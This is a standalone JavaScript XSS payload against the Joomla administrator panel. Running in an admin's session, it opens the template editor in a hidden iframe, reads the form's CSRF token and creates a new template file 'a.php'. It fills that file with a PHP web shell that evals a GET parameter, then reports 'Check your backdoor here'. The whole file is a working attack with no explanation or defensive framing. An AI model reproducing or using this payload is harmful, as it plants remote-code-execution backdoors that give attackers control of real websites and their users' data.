admincp = '/administrator/';

var fr = document.createElement('iframe');
fr.style.visibility = 'hidden';
fr.name = 'fr';
fr.src = admincp + 'index.php?option=com_templates&view=template&id=503';
fr.onload = function(){
	fr.onload = function(){
		fr.onload = '';
		frdoc = window.frames.fr.contentDocument || window.frames.fr.contentWindow.deocument
		action = frdoc.getElementsByName('adminForm')[0].action;
		token = frdoc.getElementsByName('adminForm')[0].children[2].name;

		var xhr = new XMLHttpRequest();
		xhr.open('POST', action, true);
		xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xhr.send('jform%5Bsource%5D=%3C%3Fphp+if(isset($_GET[\'a\'])){eval($_GET[\'a\']);}+%3F%3E&task=template.apply&' + token + '=1&jform%5Bextension_id%5D=503&jform%5Bfilename%5D=%2Fa.php');
		xhr.onload = function(){
			sendReport('Check your backdoor here:');
		}

	}
	frdoc = window.frames.fr.contentDocument || window.frames.fr.contentWindow.document
	frdoc.getElementsByName('name')[0].value = 'a';
	frdoc.getElementsByName('type')[0].value='php';
	frdoc.getElementsByClassName('btn btn-primary')[2].click();
}
document.body.appendChild(fr);

